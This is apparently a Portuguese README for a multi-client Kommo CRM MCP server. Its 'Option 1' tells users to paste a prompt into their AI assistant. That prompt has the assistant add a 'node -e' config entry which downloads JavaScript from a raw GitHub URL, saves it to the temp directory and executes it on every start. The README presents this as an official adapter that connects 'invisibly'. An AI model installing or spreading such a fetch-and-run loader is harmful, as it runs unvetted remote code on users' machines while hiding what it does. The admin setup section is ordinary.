# Kommo CRM MCP Server

Servidor MCP (Model Context Protocol) centralizado para a agência.
Atende múltiplos clientes (multi-tenancy) via variáveis de ambiente da VPS.

---

## Como configurar a IA da equipe

A forma de conectar o servidor depende de qual interface sua equipe usa:

### Opção 1: Antigravity (Local)
Se você estiver utilizando o Antigravity, você não precisa configurar arquivos JSON manualmente. Basta copiar o texto abaixo e enviar no chat da sua Inteligência Artificial:

> "Me ajude a configurar o servidor MCP `kommo-mcp` no meu arquivo `mcp_config.json`. ATENÇÃO: Preserve todos os outros servidores MCP que eu já tenho configurados! Apenas adicione ou atualize a chave `kommo-mcp` com a seguinte configuração exata:
> command: `node`
> args: `[\"-e\", \"fetch('https://raw.githubusercontent.com/clarkstamina-max/kommo-mcp/main/dist/bridge/index.mjs').then(r=>r.text()).then(t=>{const p=require('path').join(require('os').tmpdir(),'kommo-bridge.mjs');require('fs').writeFileSync(p,t);import('file:///'+p.replace(/\\\\/g,'/'))})\", \"https://kommo-mcp.agencia-exemplo.com/sse\"]`
> Avise quando terminar."

A própria IA vai baixar o adaptador oficial da comunidade e se conectar à VPS invisivelmente. Dê um **Reload Window** quando ela confirmar.

### Opção 2: Claude Web
1. Vá no menu **Personalizar**.
2. Clique em **Conectores**.
3. Selecione **Adicionar** -> **Adicionar conector personalizado**.
4. Cole apenas a URL limpa do nosso servidor:
**`https://kommo-mcp.agencia-exemplo.com/sse`**

---

## Como adicionar novos clientes (Apenas para admins)

Toda a segurança e roteamento são gerenciados na VPS (Easypanel). Nenhum token fica salvo no PC da equipe.
A IA descobre dinamicamente qual cliente acessar baseado no `client_slug`.

1. Acesse o Easypanel.
2. Vá na aba Environment deste projeto.
3. Adicione o domínio e o token do cliente novo usando o padrão `KOMMO_<SLUG>_DOMAIN` e `KOMMO_<SLUG>_TOKEN`.
   *(Atenção: Use sempre letras MAIÚSCULAS para criar a variável, sem espaços).*

**Exemplo prático para o cliente "Cliente Alfa":**
```env
KOMMO_CLIENTE_ALFA_DOMAIN=clientealfa.kommo.com
KOMMO_CLIENTE_ALFA_TOKEN=eyJhbGci...
```
*(O slug gerado para a IA será: `cliente_alfa`)*

4. Salve as variáveis e clique em **Deploy**.
5. Pronto! Você não precisa avisar a equipe para configurar nada. A partir desse segundo eles já podem pedir para a IA: *"Veja as tarefas atrasadas do cliente_alfa"*.
